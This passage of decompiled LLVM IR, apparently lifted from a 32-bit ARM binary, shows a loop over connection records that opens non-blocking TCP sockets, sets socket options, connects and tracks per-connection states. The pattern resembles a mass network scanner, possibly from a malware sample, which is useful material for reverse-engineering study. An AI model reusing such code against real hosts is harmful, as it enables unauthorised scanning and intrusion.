  store i32 %v2_917c, i32* %r2.global-to-local, align 4
  %v0_9184 = load i32, i32* @r5, align 4
  %v1_9188 = add i32 %v0_9184, 533
  store i32 %v1_9188, i32* %r0.global-to-local, align 4
  store i32 %v0_9164, i32* %r1.global-to-local, align 4
  %v3_9190 = call i32 @_memmove(i32 %v1_9188, i32 %v0_9164, i32 %v2_917c)
  store i32 %v3_9190, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_9198 = load i32, i32* @r5, align 4
  %v3_9198 = add i32 %v2_9198, 532
  %v4_9198 = inttoptr i32 %v3_9198 to i8*
  store i8 47, i8* %v4_9198, align 1
  %v0_91a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_919c

dec_label_pc_919c:                                ; preds = %dec_label_pc_9124, %dec_label_pc_9178
  %v0_91a0 = phi i32 [ %v0_916c, %dec_label_pc_9124 ], [ %v0_91a0.pre, %dec_label_pc_9178 ]
  %v0_919c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_919c, i32* %r1.global-to-local, align 4
  %v1_91a0 = add i32 %v0_91a0, 1440
  store i32 %v1_91a0, i32* @r0, align 4
  %v2_91a4 = inttoptr i32 %v1_91a0 to i8*
  %v3_91a4 = call i32 @function_13a7c(i8* %v2_91a4, i32 %v0_919c)
  %v0_91a8 = load i32, i32* @r5, align 4
  %v0_91ac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_91ac, i32* %r1.global-to-local, align 4
  %v1_91b0 = add i32 %v0_91a8, 1431
  store i32 %v1_91b0, i32* @r0, align 4
  %v2_91b4 = inttoptr i32 %v1_91b0 to i8*
  %v3_91b4 = call i32 @function_13a7c(i8* %v2_91b4, i32 %v0_91ac)
  %v0_91b8 = load i32, i32* @r5, align 4
  %v1_91bc = add i32 %v0_91b8, 789
  store i32 %v1_91bc, i32* @r0, align 4
  %v0_91c0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_91c0, i32* %r1.global-to-local, align 4
  %v2_91c4 = inttoptr i32 %v1_91bc to i8*
  %v3_91c4 = call i32 @function_13a7c(i8* %v2_91c4, i32 %v0_91c0)
  store i32 %v3_91c4, i32* %r0.global-to-local, align 4
  %v0_91c8 = load i32, i32* @r6, align 4
  %v1_91c8 = add i32 %v0_91c8, 20
  %v2_91c8 = inttoptr i32 %v1_91c8 to i8*
  %v3_91c8 = load i8, i8* %v2_91c8, align 1
  %v4_91c8 = zext i8 %v3_91c8 to i32
  store i32 %v4_91c8, i32* %r3.global-to-local, align 4
  %v2_91cc = icmp ugt i8 %v3_91c8, 30
  store i1 %v2_91cc, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_91cc = icmp ult i8 %v3_91c8, 31
  store i1 %v6_91cc, i1* %cpsr_n.global-to-local, align 1
  %v7_91cc = icmp eq i8 %v3_91c8, 31
  store i1 %v7_91cc, i1* %cpsr_z.global-to-local, align 1
  %v2_91d0 = xor i1 %v7_91cc, true
  %v3_91d0 = and i1 %v2_91cc, %v2_91d0
  br i1 %v3_91d0, label %dec_label_pc_abc8, label %dec_label_pc_91d4

dec_label_pc_91d4:                                ; preds = %dec_label_pc_919c
  %v1_91d4 = add i32 %v0_91c8, 16
  %v2_91d4 = inttoptr i32 %v1_91d4 to i32*
  %v3_91d4 = load i32, i32* %v2_91d4, align 4
  store i32 %v3_91d4, i32* @r4, align 4
  %v0_91d8 = call i32 @function_10bd8()
  store i32 %v0_91d8, i32* %r0.global-to-local, align 4
  %v0_91dc = load i32, i32* @r4, align 4
  %v1_91e0 = and i32 %v0_91dc, ptrtoint (i32* @global_var_ff00.79 to i32)
  store i32 %v1_91e0, i32* %r3.global-to-local, align 4
  %v1_91dc = udiv i32 %v0_91dc, 256
  %v3_91e4 = and i32 %v1_91dc, 65280
  store i32 %v3_91e4, i32* %r2.global-to-local, align 4
  %v3_91e8 = mul i32 %v0_91dc, 16777216
  %v2_91ec = and i32 %v0_91dc, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16777216)
  %v3_91ec = icmp ne i32 %v2_91ec, 0
  store i1 %v3_91ec, i1* %cpsr_c.global-to-local, align 1
  %v4_91ec = mul i32 %v1_91e0, 256
  %v5_91ec = or i32 %v4_91ec, %v3_91e8
  store i32 %v5_91ec, i32* %r1.global-to-local, align 4
  %v0_91f0 = load i32, i32* @r6, align 4
  %v1_91f0 = add i32 %v0_91f0, 20
  %v2_91f0 = inttoptr i32 %v1_91f0 to i8*
  %v3_91f0 = load i8, i8* %v2_91f0, align 1
  %v4_91f0 = zext i8 %v3_91f0 to i32
  store i32 %v4_91f0, i32* %ip.global-to-local, align 4
  %v4_91f4 = udiv i32 %v0_91dc, 16777216
  %v5_91f4 = or i32 %v3_91e4, %v4_91f4
  %v2_91f8 = or i32 %v5_91f4, %v5_91ec
  %v7_91fc = lshr i32 %v0_91d8, %v4_91f0
  %v8_91fc = add i32 %v7_91fc, %v2_91f8
  store i32 %v8_91fc, i32* %r2.global-to-local, align 4
  %v3_9208 = mul i32 %v8_91fc, 16777216
  %v1_920c = and i32 %v8_91fc, 65280
  store i32 %v1_920c, i32* %r0.global-to-local, align 4
  %v4_9210 = mul nuw nsw i32 %v1_920c, 256
  %v5_9210 = or i32 %v4_9210, %v3_9208
  store i32 %v5_9210, i32* %r1.global-to-local, align 4
  %v2_9214 = and i32 %v8_91fc, 8388608
  %v3_9214 = icmp ne i32 %v2_9214, 0
  store i1 %v3_9214, i1* %cpsr_c.global-to-local, align 1
  %v2_9218 = call i32 @llvm.bswap.i32(i32 %v8_91fc)
  store i32 %v2_9218, i32* %r3.global-to-local, align 4
  %v1_921c = load i32, i32* @r5, align 4
  %v2_921c = add i32 %v1_921c, 16
  %v3_921c = inttoptr i32 %v2_921c to i32*
  store i32 %v2_9218, i32* %v3_921c, align 4
  br label %dec_label_pc_abc8

dec_label_pc_924c:                                ; preds = %thread-pre-split
  %v1_9250 = add i32 %v2_9108, 1456
  %v0_9258 = load i32, i32* %r8.global-to-local, align 4
  %v1_9258 = urem i32 %v0_9258, 256
  store i32 %v1_9258, i32* %r3.global-to-local, align 4
  %v1_925c = add i32 %v2_9108, 1464
  store i32 %v1_925c, i32* %r1.global-to-local, align 4
  %v2_9260 = ptrtoint i32* %stack_var_-10568 to i32
  store i32 %v2_9260, i32* %r2.global-to-local, align 4
  store i32 %v1_9250, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_9280.preheader

dec_label_pc_9280.preheader:                      ; preds = %dec_label_pc_924c, %dec_label_pc_abec
  %storemerge148.in.in = phi i32 [ %v0_ac00, %dec_label_pc_abec ], [ %v0_9258, %dec_label_pc_924c ]
  %stack_var_-20868.0.ph = phi i32 [ %v1_abf8, %dec_label_pc_abec ], [ %v1_9250, %dec_label_pc_924c ]
  %stack_var_-20860.0.ph = phi i32 [ %v1_ac00, %dec_label_pc_abec ], [ %v1_9258, %dec_label_pc_924c ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_ac04, %dec_label_pc_abec ], [ %v1_925c, %dec_label_pc_924c ]
  %stack_var_-20856.0.ph = phi i32 [ %v2_ac08, %dec_label_pc_abec ], [ %v2_9260, %dec_label_pc_924c ]
  %storemerge148.in = and i32 %storemerge148.in.in, 128
  %storemerge148 = icmp ne i32 %storemerge148.in, 0
  store i1 %storemerge148, i1* %cpsr_c.global-to-local, align 1
  %v3_ac10 = udiv i32 %storemerge148.in.in, 256
  store i32 %v3_ac10, i32* %r8.global-to-local, align 4
  %v4_92e8 = mul nuw nsw i32 %stack_var_-20860.0.ph, 256
  %v2_9428 = ptrtoint i32* %stack_var_-148 to i32
  %v2_9440 = ptrtoint i32* %stack_var_-40 to i32
  %v2_9480 = ptrtoint i32* %stack_var_-72 to i32
  %v2_94a0 = ptrtoint i32* %stack_var_-36 to i32
  %v1_9698 = inttoptr i32 %stack_var_-20856.0.ph to i8*
  %v1_99ec = icmp slt i32 %v6_8f58, 0
  %v2_99ec = icmp eq i32 %v6_8f58, 0
  %v1_98e8 = inttoptr i32 %v6_8f58 to i8*
  %v2_950c = ptrtoint i32* %stack_var_-56 to i32
  %v2_9510 = ptrtoint i32* %stack_var_-200 to i32
  %v2_9514 = ptrtoint i32* %stack_var_-328 to i32
  %v2_9f74 = add i32 %v2_94a0, -20773
  %v2_9600 = ptrtoint i32* %stack_var_-44 to i32
  %v2_960c = ptrtoint i32* %stack_var_-48 to i32
  %v5_92e8 = or i32 %v4_92e8, %v3_ac10
  %v1_92ec = and i32 %v3_ac10, 128
  %v2_92ec = icmp ne i32 %v1_92ec, 0
  %v3_92ec248 = udiv i32 %v5_92e8, 256
  %v1_92f4 = add i32 %stack_var_-20872.0.ph, -1464
  %v1_92fc = add i32 %stack_var_-20872.0.ph, -33
  %sext = mul i32 %v3_92ec248, 16777216
  %v4_9468 = sdiv i32 %sext, 16777216
  %sext10 = mul i32 %v3_ac10, 16777216
  %v4_9470 = sdiv i32 %sext10, 16777216
  %v2_9334 = add i32 %v2_9428, 112
  br label %dec_label_pc_9280

dec_label_pc_9280:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_92cc, %dec_label_pc_94e4, %dec_label_pc_9590, %dec_label_pc_9280.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9284 = call i32 @time(i32* null)
  store i32 %v2_9284, i32* %r0.global-to-local, align 4
  store i32 %v2_9284, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 20684, i32* %ip.global-to-local, align 4
  %v2_92a4256 = load i32, i32* @sp, align 4
  %v3_92a4257 = add i32 %v2_92a4256, 20684
  %v4_92a4258 = inttoptr i32 %v3_92a4257 to i32*
  store i32 0, i32* %v4_92a4258, align 4
  br label %dec_label_pc_9294.dec_label_pc_9294_crit_edge

dec_label_pc_9294.dec_label_pc_9294_crit_edge:    ; preds = %dec_label_pc_9280, %dec_label_pc_9294.dec_label_pc_9294_crit_edge
  %v0_9294.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_92a4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_9298 = add i32 %v0_9294.pre, 4
  store i32 %v1_9298, i32* %r3.global-to-local, align 4
  %v1_929c = add i32 %v0_9294.pre, 20684
  store i32 %v1_929c, i32* %ip.global-to-local, align 4
  %v7_92a0 = icmp eq i32 %v1_9298, 128
  %v2_92a4 = load i32, i32* @sp, align 4
  %v3_92a4 = add i32 %v2_92a4, %v1_929c
  %v4_92a4 = inttoptr i32 %v3_92a4 to i32*
  store i32 %v0_92a4.pre, i32* %v4_92a4, align 4
  br i1 %v7_92a0, label %dec_label_pc_92ac, label %dec_label_pc_9294.dec_label_pc_9294_crit_edge

dec_label_pc_92ac:                                ; preds = %dec_label_pc_9294.dec_label_pc_9294_crit_edge
  %v1_92a0 = add i32 %v0_9294.pre, -124
  %v6_92a0 = icmp slt i32 %v1_92a0, 0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_92a0, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_92ac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_92ac, i32* %r0.global-to-local, align 4
  %v1_92b8259 = add i32 %v0_92ac, 4
  store i32 %v1_92b8259, i32* %r3.global-to-local, align 4
  %v1_92bc260 = add i32 %v0_92ac, 20556
  store i32 %v1_92bc260, i32* %lr.global-to-local, align 4
  %v7_92c0261 = icmp eq i32 %v1_92b8259, 128
  %v2_92c4262 = load i32, i32* @sp, align 4
  %v3_92c4263 = add i32 %v2_92c4262, %v1_92bc260
  %v4_92c4264 = inttoptr i32 %v3_92c4263 to i32*
  store i32 %v0_92ac, i32* %v4_92c4264, align 4
  br i1 %v7_92c0261, label %dec_label_pc_92cc, label %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge

dec_label_pc_92b4.dec_label_pc_92b4_crit_edge:    ; preds = %dec_label_pc_92ac, %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge
  %v0_92b4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_92c4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_92b8 = add i32 %v0_92b4.pre, 4
  store i32 %v1_92b8, i32* %r3.global-to-local, align 4
  %v1_92bc = add i32 %v0_92b4.pre, 20556
  store i32 %v1_92bc, i32* %lr.global-to-local, align 4
  %v7_92c0 = icmp eq i32 %v1_92b8, 128
  %v2_92c4 = load i32, i32* @sp, align 4
  %v3_92c4 = add i32 %v2_92c4, %v1_92bc
  %v4_92c4 = inttoptr i32 %v3_92c4 to i32*
  store i32 %v0_92c4.pre, i32* %v4_92c4, align 4
  br i1 %v7_92c0, label %dec_label_pc_92cc, label %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge

dec_label_pc_92cc:                                ; preds = %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge, %dec_label_pc_92ac
  store i32 %v0_90f4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_9110, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_9110, i1* %cpsr_z.global-to-local, align 1
  br i1 %tmp207, label %dec_label_pc_9280, label %dec_label_pc_92d8

dec_label_pc_92d8:                                ; preds = %dec_label_pc_92cc
  store i32 %stack_var_-20872.0.ph, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 %v5_92e8, i32* %r2.global-to-local, align 4
  store i1 %v2_92ec, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_92ec248, i32* %lr.global-to-local, align 4
  %v0_92f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_92f0, i32* @sl, align 4
  store i32 %v1_92f4, i32* @r7, align 4
  store i32 %v0_92f0, i32* @r8, align 4
  store i32 %v1_92fc, i32* @r6, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_93a8

dec_label_pc_9310:                                ; preds = %dec_label_pc_93b4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v7_9310 = icmp eq i8 %v3_93a8, 2
  store i1 %v7_9310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9310, label %dec_label_pc_9ac0, label %dec_label_pc_9318

dec_label_pc_9318:                                ; preds = %dec_label_pc_9310
  %v2_9318 = icmp ugt i8 %v3_93a8, 3
  store i1 %v2_9318, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9318 = icmp ult i8 %v3_93a8, 4
  store i1 %v6_9318, i1* %cpsr_n.global-to-local, align 1
  %v7_9318 = icmp eq i8 %v3_93a8, 4
  store i1 %v7_9318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9318, label %dec_label_pc_9664, label %dec_label_pc_9320

dec_label_pc_9320:                                ; preds = %dec_label_pc_9318
  %v2_9320 = icmp ugt i8 %v3_93a8, 5
  store i1 %v2_9320, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9320 = icmp ult i8 %v3_93a8, 6
  store i1 %v6_9320, i1* %cpsr_n.global-to-local, align 1
  %v7_9320 = icmp eq i8 %v3_93a8, 6
  store i1 %v7_9320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9320, label %.thread24, label %dec_label_pc_9340

.thread24:                                        ; preds = %dec_label_pc_9320
  %v2_9324 = add i32 %v3_9658, -1431
  %v3_9324 = inttoptr i32 %v2_9324 to i32*
  %v4_9324 = load i32, i32* %v3_9324, align 4
  store i32 %v4_9324, i32* %r0.global-to-local, align 4
  %v4_932c = udiv i32 %v4_9324, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_9330 = mul nuw nsw i32 %v4_932c, 4
  store i32 %v2_9334, i32* %r1.global-to-local, align 4
  %v3_9338 = add i32 %v4_9330, %v2_9334
  store i32 %v3_9338, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9aa0

dec_label_pc_9340:                                ; preds = %dec_label_pc_9320
  %v2_9340 = icmp ugt i8 %v3_93a8, 6
  store i1 %v2_9340, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9340 = icmp ult i8 %v3_93a8, 7
  store i1 %v6_9340, i1* %cpsr_n.global-to-local, align 1
  %v7_9340 = icmp eq i8 %v3_93a8, 7
  store i1 %v7_9340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9340, label %.thread35, label %dec_label_pc_9360

.thread35:                                        ; preds = %dec_label_pc_9340
  %v2_9344 = add i32 %v3_9658, -1431
  %v3_9344 = inttoptr i32 %v2_9344 to i32*
  %v4_9344 = load i32, i32* %v3_9344, align 4
  store i32 %v4_9344, i32* %r0.global-to-local, align 4
  %v4_934c = udiv i32 %v4_9344, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_9350 = mul nuw nsw i32 %v4_934c, 4
  store i32 %v2_9334, i32* %r2.global-to-local, align 4
  %v3_9358 = add i32 %v4_9350, %v2_9334
  store i32 %v3_9358, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9aa0

dec_label_pc_9360:                                ; preds = %dec_label_pc_9340
  %v2_9360 = icmp ugt i8 %v3_93a8, 9
  store i1 %v2_9360, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9360 = icmp ult i8 %v3_93a8, 10
  store i1 %v6_9360, i1* %cpsr_n.global-to-local, align 1
  %v7_9360 = icmp eq i8 %v3_93a8, 10
  store i1 %v7_9360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9360, label %dec_label_pc_9a88, label %dec_label_pc_9368

dec_label_pc_9368:                                ; preds = %dec_label_pc_9360
  %v1_9368 = add nsw i32 %v4_93a8, -11
  %v2_9368 = icmp ugt i8 %v3_93a8, 10
  store i1 %v2_9368, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9368 = icmp ult i8 %v3_93a8, 11
  store i1 %v6_9368, i1* %cpsr_n.global-to-local, align 1
  %v7_9368 = icmp eq i8 %v3_93a8, 11
  store i1 %v7_9368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9368, label %dec_label_pc_a5fc, label %dec_label_pc_9370

dec_label_pc_9370:                                ; preds = %dec_label_pc_9ac0, %dec_label_pc_9368
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_93a8, align 1
  %v0_9378 = load i32, i32* @r6, align 4
  %v1_9378 = add i32 %v0_9378, -1431
  %v2_9378 = inttoptr i32 %v1_9378 to i32*
  %v3_9378 = load i32, i32* %v2_9378, align 4
  store i32 %v3_9378, i32* %r0.global-to-local, align 4
  %v1_937c = call i32 @close(i32 %v3_9378)
  store i32 %v1_937c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_9384 = load i32, i32* @r6, align 4
  %v2_9384 = add i32 %v1_9384, -1431
  %v3_9384 = inttoptr i32 %v2_9384 to i32*
  store i32 -1, i32* %v3_9384, align 4
  br label %dec_label_pc_9388

dec_label_pc_9388:                                ; preds = %dec_label_pc_9a24, %dec_label_pc_9aa0, %dec_label_pc_94a8, %dec_label_pc_93bc, %dec_label_pc_a5fc, %dec_label_pc_9370
  store i32 %v0_90f4, i32* %lr.global-to-local, align 4
  %v0_938c = load i32, i32* @r8, align 4
  %v1_938c = add i32 %v0_938c, 1
  store i32 %v1_938c, i32* @r8, align 4
  %v0_9390 = load i32, i32* @r7, align 4
  %v0_9394 = load i32, i32* @r6, align 4
  %v2_9398 = sub i32 %v0_90f4, %v1_938c
  %v3_9398 = icmp uge i32 %v0_90f4, %v1_938c
  store i1 %v3_9398, i1* %cpsr_c.global-to-local, align 1
  %v4_9398 = xor i32 %v1_938c, %v0_90f4
  %v5_9398 = xor i32 %v2_9398, %v0_90f4
  %v6_9398 = and i32 %v5_9398, %v4_9398
  %v7_9398 = icmp slt i32 %v6_9398, 0
  store i1 %v7_9398, i1* %cpsr_v.global-to-local, align 1
  %v8_9398 = icmp slt i32 %v2_9398, 0
  store i1 %v8_9398, i1* %cpsr_n.global-to-local, align 1
  %v9_9398 = icmp eq i32 %v0_90f4, %v1_938c
  store i1 %v9_9398, i1* %cpsr_z.global-to-local, align 1
  %v1_939c = add i32 %v0_9390, 3140
  store i32 %v1_939c, i32* @r7, align 4
  %v1_93a0 = add i32 %v0_9394, 3140
  store i32 %v1_93a0, i32* @r6, align 4
  br i1 %v9_9398, label %dec_label_pc_9388.dec_label_pc_94e4_crit_edge, label %dec_label_pc_93a8

dec_label_pc_9388.dec_label_pc_94e4_crit_edge:    ; preds = %dec_label_pc_9388
  %v0_94e4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_94e4

dec_label_pc_93a8:                                ; preds = %dec_label_pc_94c4, %dec_label_pc_9388, %dec_label_pc_92d8
  %v3_9658 = phi i32 [ %v1_92fc, %dec_label_pc_92d8 ], [ %v1_93a0, %dec_label_pc_9388 ], [ %v1_94dc, %dec_label_pc_94c4 ]
  %v1_93a8 = add i32 %v3_9658, -1427
  %v2_93a8 = inttoptr i32 %v1_93a8 to i8*
  %v3_93a8 = load i8, i8* %v2_93a8, align 1
  %v4_93a8 = zext i8 %v3_93a8 to i32
  store i32 %v4_93a8, i32* %r3.global-to-local, align 4
  %v2_93ac = icmp ne i8 %v3_93a8, 0
  store i1 %v2_93ac, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_93ac = icmp eq i8 %v3_93a8, 0
  store i1 %v6_93ac, i1* %cpsr_n.global-to-local, align 1
  %v7_93ac = icmp eq i8 %v3_93a8, 1
  store i1 %v7_93ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93ac, label %dec_label_pc_964c, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_93a8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v6_93ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_93ac, label %dec_label_pc_93bc, label %dec_label_pc_9310

dec_label_pc_93bc:                                ; preds = %.thread43.dec_label_pc_93bc_crit_edge, %dec_label_pc_93b4
  %v0_93bc = phi i32 [ %v0_93bc.pre, %.thread43.dec_label_pc_93bc_crit_edge ], [ %v3_9658, %dec_label_pc_93b4 ]
  %v1_93bc = add i32 %v0_93bc, -1431
  %v2_93bc = inttoptr i32 %v1_93bc to i32*
  %v3_93bc = load i32, i32* %v2_93bc, align 4
  store i32 %v3_93bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v1_93c8 = add i32 %v3_93bc, 1
  %v2_93c8 = icmp eq i32 %v3_93bc, -1
  store i1 %v2_93c8, i1* %cpsr_c.global-to-local, align 1
  %v3_93c8 = sub i32 0, %v3_93bc
  %v4_93c8 = and i32 %v1_93c8, %v3_93c8
  %v5_93c8 = icmp slt i32 %v4_93c8, 0
  store i1 %v5_93c8, i1* %cpsr_v.global-to-local, align 1
  %v6_93c8 = icmp slt i32 %v1_93c8, 0
  store i1 %v6_93c8, i1* %cpsr_n.global-to-local, align 1
  %v7_93c8 = icmp eq i32 %v1_93c8, 0
  store i1 %v7_93c8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-72, align 4
  store i32 37856, i32* %lr.global-to-local, align 4
  %v1_93dc = xor i1 %v7_93c8, true
  call void @__pseudo_cond_branch(i1 %v1_93dc, i32 ptrtoint (i32* @global_var_8dcc.81 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_93e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_93e8, i32* %r2.global-to-local, align 4
  %v3_93ec = call i32 @_socket(i32 2, i32 1, i32 %v0_93e8)
  store i32 %v3_93ec, i32* %r0.global-to-local, align 4
  %v1_93f0 = add i32 %v3_93ec, 1
  %v2_93f0 = icmp eq i32 %v3_93ec, -1
  store i1 %v2_93f0, i1* %cpsr_c.global-to-local, align 1
  %v3_93f0 = sub i32 0, %v3_93ec
  %v4_93f0 = and i32 %v1_93f0, %v3_93f0
  %v5_93f0 = icmp slt i32 %v4_93f0, 0
  store i1 %v5_93f0, i1* %cpsr_v.global-to-local, align 1
  %v6_93f0 = icmp slt i32 %v1_93f0, 0
  store i1 %v6_93f0, i1* %cpsr_n.global-to-local, align 1
  %v7_93f0 = icmp eq i32 %v1_93f0, 0
  store i1 %v7_93f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_93ec, i32* @r4, align 4
  %v1_93f8 = load i32, i32* @r6, align 4
  %v2_93f8 = add i32 %v1_93f8, -1431
  %v3_93f8 = inttoptr i32 %v2_93f8 to i32*
  store i32 %v3_93ec, i32* %v3_93f8, align 4
  br i1 %v7_93f0, label %dec_label_pc_9388, label %dec_label_pc_9400

dec_label_pc_9400:                                ; preds = %dec_label_pc_93bc
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_9404 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_9404, i32* %r2.global-to-local, align 4
  %v0_9408 = load i32, i32* %r0.global-to-local, align 4
  %v2_9408 = call i32 (i32, i32, ...) @fcntl(i32 %v0_9408, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9410 = or i32 %v2_9408, 2048
  store i32 %v1_9410, i32* %r2.global-to-local, align 4
  %v0_9414 = load i32, i32* @r4, align 4
  store i32 %v0_9414, i32* %r0.global-to-local, align 4
  %v2_9418 = call i32 (i32, i32, ...) @fcntl(i32 %v0_9414, i32 4)
  store i32 %v2_9418, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 65535, i32* %ip.global-to-local, align 4
  store i32 %v2_9428, i32* %r3.global-to-local, align 4
  %v0_942c = load i32, i32* @r6, align 4
  %v1_942c = add i32 %v0_942c, -1431
  %v2_942c = inttoptr i32 %v1_942c to i32*
  %v3_942c = load i32, i32* %v2_942c, align 4
  store i32 %v3_942c, i32* %r0.global-to-local, align 4
  %v0_9430 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_9430, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %stack_var_-40, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_9440, i32* %r3.global-to-local, align 4
  %v0_9448 = call i32 @_setsockopt()
  store i32 %v0_9448, i32* %r0.global-to-local, align 4
  %v0_944c = load i32, i32* @r6, align 4
  %v1_944c = add i32 %v0_944c, -1415
  %v2_944c = inttoptr i32 %v1_944c to i32*
  %v3_944c = load i32, i32* %v2_944c, align 4
  store i32 %v3_944c, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_945c = add i32 %v0_944c, -1431
  %v2_945c = inttoptr i32 %v1_945c to i32*
  %v3_945c = load i32, i32* %v2_945c, align 4
  store i32 %v3_945c, i32* @r0, align 4
  %v3_9464 = add i32 %v0_944c, -1427
  %v4_9464 = inttoptr i32 %v3_9464 to i8*
  store i8 2, i8* %v4_9464, align 1
  store i32 %v4_9468, i32* %ip.global-to-local, align 4
  %v0_946c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_946c, i32* %stack_var_-72, align 4
  store i32 %v4_9470, i32* %r3.global-to-local, align 4
  store i32 %v2_9480, i32* @r1, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_9488 = load i32, i32* %sb.global-to-local, align 4
  %v1_9488 = load i32, i32* @r6, align 4
  %v2_9488 = add i32 %v1_9488, -1423
  %v3_9488 = inttoptr i32 %v2_9488 to i32*
  store i32 %v0_9488, i32* %v3_9488, align 4
  %v3_948c = call i32 @_connect(i32 %v3_945c, i32 %v2_9480, i32 16)
  store i32 %v3_948c, i32* %r0.global-to-local, align 4
  %v0_9490 = load i32, i32* @r6, align 4
  %v1_9490 = add i32 %v0_9490, -1431
  %v2_9490 = inttoptr i32 %v1_9490 to i32*
  %v3_9490 = load i32, i32* %v2_9490, align 4
  store i32 %v3_9490, i32* %r0.global-to-local, align 4
  %v3_9498 = udiv i32 %v3_9490, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_949c = mul nuw nsw i32 %v3_9498, 4
  store i32 %v3_949c, i32* %r3.global-to-local, align 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_94a8

dec_label_pc_94a8:                                ; preds = %dec_label_pc_9ad0, %dec_label_pc_9400
  %v1_94b4 = phi i32 [ %v3_9490, %dec_label_pc_9400 ], [ %v3_9ad0, %dec_label_pc_9ad0 ]
  %v3_949c.pn = phi i32 [ %v3_949c, %dec_label_pc_9400 ], [ %v3_9adc, %dec_label_pc_9ad0 ]
  %storemerge = add i32 %v3_949c.pn, %v2_94a0
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_94a8 = add i32 %storemerge, -292
  %v2_94a8 = inttoptr i32 %v1_94a8 to i32*
  %v3_94a8 = load i32, i32* %v2_94a8, align 4
